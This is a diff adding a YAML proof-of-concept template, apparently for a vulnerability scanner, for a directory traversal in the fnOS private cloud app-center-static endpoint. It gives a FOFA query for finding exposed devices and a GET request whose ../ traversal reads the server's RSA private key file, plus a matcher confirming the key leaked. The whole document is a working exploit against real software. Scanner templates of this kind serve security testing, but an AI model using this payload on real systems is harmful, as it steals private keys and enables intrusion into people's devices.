@@ -1,0 +1,16 @@
+id: poc-yaml-fnos-app-center-static-directory-traversal
+info:
+  name: fnOS app-center-static 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: fnos
+  fofa: app="飞牛-私有云fnOS"
+requests:
+- method: GET
+  path: /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../usr/trim/etc/rsa_private_key.pem
+  expression: status_code == 200 && contains(body,"BEGIN PRIVATE KEY") && contains(body,"END
+    PRIVATE KEY") && !contains(body,"<") && contains(content_type,"application/x-x509-ca-cert")
+    && matches(body,"(\\n([A-Za-z0-9+\\/]+\\s*)*={0,2}\\n)")
+variables: {}
+transport: http
